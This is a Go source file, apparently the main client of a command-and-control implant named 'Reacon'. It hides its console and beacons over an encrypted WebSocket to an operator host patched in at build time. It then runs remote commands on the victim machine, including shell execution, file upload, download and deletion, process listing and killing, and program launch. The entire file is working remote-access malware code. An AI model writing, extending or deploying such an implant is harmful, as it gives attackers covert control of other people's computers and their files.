package main

import (
	"Reacon/pkg/communication"
	"Reacon/pkg/config"
	"Reacon/pkg/encrypt"
	"Reacon/pkg/services"
	"Reacon/pkg/utils"
	"encoding/binary"
	"errors"
	"fmt"
	"github.com/togettoyou/wsc"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"
)

type Client struct {
	Connection *wsc.Wsc
	lock       sync.Mutex
	keepAlive  *time.Ticker
}

func Run_main(url string) {
	WebsocketClient := &Client{}
	WebsocketClient.Connect(url)
}

func (c *Client) Connect(url string) {
	runtime.GC()
	done := make(chan bool)
	c.Connection = wsc.New(url)
	c.Connection.SetConfig(&wsc.Config{
		WriteWait:         10 * time.Second,
		MinRecTime:        2 * time.Second,
		MaxRecTime:        60 * time.Second,
		RecFactor:         1.5,
		MessageBufferSize: 10240 * 10,
	})

	// firstBlood
	c.Connection.OnConnected(func() {
		if len(utils.MetaInfo) == 0 {
			utils.MetaInfo, _ = utils.EncryptedMetaInfo()
			utils.MetaInfo, _ = encrypt.EncodeBase64(utils.MetaInfo)
		}
		firstBloodInt := 1
		firstBloodBytes := utils.WriteInt(firstBloodInt)
		firstBloodMsg := utils.BytesCombine(firstBloodBytes, utils.MetaInfo)
		communication.SendData(c.Connection, firstBloodMsg)
		utils.WebsocketClient = c.Connection
	})

	c.Connection.OnConnectError(func(err error) {

	})

	c.Connection.OnDisconnected(func(err error) {
	})

	c.Connection.OnClose(func(code int, text string) {
		done <- true
	})
	c.Connection.OnTextMessageSent(func(message string) {

	})
	c.Connection.OnBinaryMessageSent(func(data []byte) {

	})
	c.Connection.OnSentError(func(err error) {

	})
	c.Connection.OnPingReceived(func(appData string) {

		runtime.GC()
	})
	c.Connection.OnPongReceived(func(appData string) {

	})

	c.Connection.OnTextMessageReceived(func(message string) {
	})

	c.Connection.OnBinaryMessageReceived(func(data []byte) {
		go func() {
			if data != nil {
				totalLen := len(data)
				if totalLen > 0 {
					rawData, err := encrypt.DecodeBase64(data)
					if err != nil {
						fmt.Println(err)
					}
					data, err = encrypt.Decrypt(rawData)
					if err != nil {
						fmt.Println(err)
					}
					decrypted, err := encrypt.Decrypt(data)
					if err != nil {
						communication.ErrorProcess(err)
						fmt.Println(err)
					}
					if len(decrypted) < 4 {
						return
					}
					cmdType := binary.BigEndian.Uint32(decrypted[:4])
					cmdBuf := decrypted[4:]
					if cmdBuf != nil {
						var err error
						var callbackType int
						var result []byte
						switch cmdType {
						case services.SHELL: // shell
							result, err = services.CmdShell(cmdBuf)
							callbackType = 0
						case services.UploadStart: //upload 第一次
							result, err = services.CmdUpload(cmdBuf, true)
							callbackType = 0
						case services.UploadLoop: //upload 后续的upload
							result, err = services.CmdUpload(cmdBuf, false)
							callbackType = 0
						case services.DOWNLOAD: //download   2
							result, err = services.CmdDownload(cmdBuf)
							callbackType = 0
						case services.FileBrowse: //File Browser
							result, err = services.CmdFileBrowse(cmdBuf)
							callbackType = services.FileBrowse
						case services.CD: //cd
							result, err = services.CmdCd(cmdBuf)
							callbackType = 0
						case services.SLEEP: //sleep
							result, err = services.CmdSleep(cmdBuf)
							callbackType = 0
						case services.PAUSE: //pause
							result, err = services.CmdPause(cmdBuf)
							callbackType = 0
						case services.PWD: //pwd
							result, err = services.CmdPwd()
							callbackType = 0
						case services.EXIT: //exit
							result, err = services.CmdExit()
							if err == nil {
								os.Exit(1)
							}
							callbackType = 0
						case services.EXECUTE: // windows 后台执行程序
							result, err = services.CmdExecute(cmdBuf)
							callbackType = 0
						case services.PS: // ps 列出进程
							result, err = services.CmdPs()
							callbackType = services.PS
						case services.KILL: //kill
							result, err = services.CmdKill(cmdBuf)
							callbackType = 0
						case services.MKDIR: //mkdir
							result, err = services.CmdMkdir(cmdBuf)
							callbackType = 0
						case services.DRIVES: //list drives  2
							result, err = services.CmdDrives()
							callbackType = services.DRIVES
						case services.RM: //rm
							result, err = services.CmdRm(cmdBuf)
							callbackType = 0
						case services.CP: //cp
							result, err = services.CmdCp(cmdBuf)
							callbackType = 0
						case services.MV: //mv
							result, err = services.CmdMv(cmdBuf)
							callbackType = 0
						case services.FileContent:
							result, err = services.GetFileContent(cmdBuf)
							callbackType = 0
						default:
							err = errors.New("not supported command")
						}
						// convert charset here
						if err != nil {
							communication.ErrorProcess(err)
						} else {
							if callbackType >= 0 {
								communication.DataProcess(callbackType, result)
							}
						}
					}
				}
			}
		}()
	})
	c.keepAlive = time.NewTicker(5 * time.Second)

	c.Connection.Connect()
	go func() {
		for range c.keepAlive.C {
			c.KeepAlivePacket()
		}
	}()
	for {
		select {
		case <-done:
			return
		}
	}
}

func (c *Client) KeepAlivePacket() {
	heartBeatInt := 3
	heartBeatBytes := utils.WriteInt(heartBeatInt)
	heartBeatMsg := utils.BytesCombine(heartBeatBytes, utils.MetaInfo)
	communication.SendData(c.Connection, heartBeatMsg)
}

func main() {
	if config.ExecuteKey != "" {
		if len(os.Args) != 2 {
			return
		}
		if os.Args[1] != config.ExecuteKey {
			return
		}
	}
	errConsole := services.HideConsole()
	if errConsole != nil && errConsole.Error() != "" {
		fmt.Println(errConsole)
	}
	// windows 下设置不需要DPI缩放
	errDPI := services.ProcessDPIAware()
	if errDPI != nil && errDPI.Error() != "" {
		fmt.Println(errDPI)
	}
	host := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	host = strings.ReplaceAll(host, " ", "")
	Run_main("ws://" + host + "/ws")
}
